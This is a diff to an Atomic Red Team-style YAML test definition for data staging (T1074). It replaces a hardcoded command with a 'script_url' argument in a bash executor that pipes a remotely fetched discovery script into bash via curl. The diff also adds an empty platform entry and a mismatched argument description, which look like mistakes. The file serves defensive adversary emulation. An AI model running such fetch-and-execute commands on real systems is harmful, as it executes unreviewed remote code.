@@ -23,11 +23,17 @@ atomic_tests:
   supported_platforms:
     - linux
     - macos
+    -
+  input_arguments:
+    script_url:
+      description: Output folder containing copies of SSH private key files
+      type: url
+      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh
 
   executor:
     name: bash
     command: |
-      curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074/src/Discovery.sh | bash -s > /tmp/discovery.log
+      curl -s #{script_url} | bash -s > /tmp/discovery.log
 
 - name: Zip a Folder with PowerShell for Staging in Temp
   description: |
